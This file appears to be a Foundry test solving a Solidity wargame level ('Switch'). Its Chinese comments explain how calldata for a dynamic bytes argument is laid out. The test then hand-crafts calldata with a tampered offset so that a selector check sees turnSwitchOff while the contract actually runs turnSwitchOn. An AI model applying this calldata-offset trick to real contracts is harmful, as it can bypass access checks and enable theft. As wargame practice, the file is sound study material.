// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Switch} from "../src/Switch.sol";

/*
https://docs.soliditylang.org/en/v0.8.11/abi-spec.html#examples

调用flipSwitch(bytes memory _data)时，calldata如下

1. 4 bytes: the Method ID
-----------arguments block-----------
2. 32 bytes: _data在arguments block中的位置，

3. 32 bytes: _data的长度，单位byte
4. _data的内容，并且在右边填充，使得长度是32 bytes的倍数

ps: calldata从第4个字节后面的内容，称为arguments block

example
abi.encodeWithSignature("flipSwitch(bytes memory)", abi.encodeWithSignature("turnSwitchOn()"))
0xa6f2c4d30000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
1. a6f2c4d3: flipSwitch的method id
2. 0000000000000000000000000000000000000000000000000000000000000020: _data在arguments block中的位置，第32个字节开始就是_data
3. 0000000000000000000000000000000000000000000000000000000000000004: _data的长度，4
4. 76227e1200000000000000000000000000000000000000000000000000000000: 前4个字节是_data的内容，后面是填充的


在上面的calldata拼接abi.encodeWithSignature("turnSwitchOff()")，然后修改第2部分的内容，是得_data是abi.encodeWithSignature("turnSwitchOff()")即可
*/

contract SwitchTest is Test {
    function testSwitch() public {
        Switch _switch = new Switch();

        bytes memory turnSwitchOnCallData = abi.encodeWithSignature("turnSwitchOn()");
        bytes memory turnSwitchOffCallData = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory flipSwitchCallData = abi.encodePacked(
            abi.encodeWithSignature("flipSwitch(bytes)", turnSwitchOffCallData),
            abi.encode(turnSwitchOnCallData)
        );

        flipSwitchCallData[35] = 0x80;

        console.logBytes(flipSwitchCallData);
        /*
        30c13ade
        0000000000000000000000000000000000000000000000000000000000000080
        0000000000000000000000000000000000000000000000000000000000000004
        20606e1500000000000000000000000000000000000000000000000000000000
        0000000000000000000000000000000000000000000000000000000000000020
        0000000000000000000000000000000000000000000000000000000000000004
        76227e1200000000000000000000000000000000000000000000000000000000
        */


        address(_switch).call(flipSwitchCallData);

        console.log(_switch.switchOn());
        assert(_switch.switchOn() == true);
    }
}